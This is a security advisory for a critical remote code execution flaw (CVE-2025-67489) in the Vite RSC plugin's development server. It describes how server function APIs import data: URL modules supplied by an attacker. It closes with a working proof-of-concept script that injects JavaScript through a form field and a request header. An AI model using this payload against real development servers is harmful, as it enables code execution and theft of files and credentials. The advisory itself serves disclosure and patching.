# [C] @vitejs/plugin-rsc Remote Code Execution through unsafe dynamic imports in RSC server function APIs on development server

## Summary
Severity: Critical
Advisory: GHSA-j76j-5p5g-9wfr
CVE: CVE-2025-67489
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-12-08
Source: https://github.com/advisories/GHSA-j76j-5p5g-9wfr
Type: github-advisory

## Affected
- npm: `@vitejs/plugin-rsc` — affected >=0 <0.5.6

## Details
## Summary

Arbitrary Remote Code Execution on development server via unsafe dynamic imports in `@vitejs/plugin-rsc` server function APIs (`loadServerAction`, `decodeReply`, `decodeAction`) when integrated into RSC applications that expose server function endpoints.

## Impact

Attackers with network access to the development server can execute arbitrary JavaScript code with Node.js privileges, allowing them to read/modify files, exfiltrate sensitive data (source code, environment variables, credentials), or pivot to other internal services. While this affects development servers only, the risk increases when using `vite --host` to expose the server on all network interfaces.


## Details

In the example RSC application provided in Proof of Concept, the server handles server function call through API such as `loadServerAction`, `decodeReply`, `decodeAction` with http request's header and body as inputs:

https://github.com/vitejs/vite-plugin-react/blob/c8af971f57f12d0190d7fd8829a429f5e4112f60/packages/plugin-rsc/examples/starter/src/framework/entry.rsc.tsx#L42-L47

During development, these API internally relies on dynamic import to load server function module, which allows executing arbitrary module including data url module.

https://github.com/vitejs/vite-plugin-react/blob/c8af971f57f12d0190d7fd8829a429f5e4112f60/packages/plugin-rsc/src/rsc.tsx#L19-L24

## Proof of Concept

The example app is avialable in
- https://github.com/vitejs/vite-plugin-react/tree/main/packages/plugin-rsc/examples/starter
- https://stackblitz.com/edit/github-rubfqp9k?file=poc.js

**Reproduction Steps:**

- Stat development server `vite dev`
- Run a following script `node poc.js`
- See "REMOTE CODE EXECUTION1" and "REMOTE CODE EXECUTION2"  in server console

```js
// [poc.js]
const payload = {
  0: ["$F1"],
  1: { id: "data:text/javascript,console.log('REMOTE CODE EXECUTION 1')# " },
};
const fd = new FormData();
for (const key in payload) {
  fd.append(key, JSON.stringify(payload[key]));
}

const serverUrl = process.argv[2] || 'http://localhost:5173/_.rsc';
const response = fetch(serverUrl, {
  method: "POST",
  headers: {
    "x-rsc-action": "data:text/javascript,console.log('REMOTE CODE EXECUTION 2')# ",
  },
  body: fd,
})
```

## References
- https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-j76j-5p5g-9wfr
- https://nvd.nist.gov/vuln/detail/CVE-2025-67489
- https://github.com/vitejs/vite-plugin-react/commit/fe634b58210d0a4a146a7faae56cd71af3bb9af4
- https://github.com/vitejs/vite-plugin-react
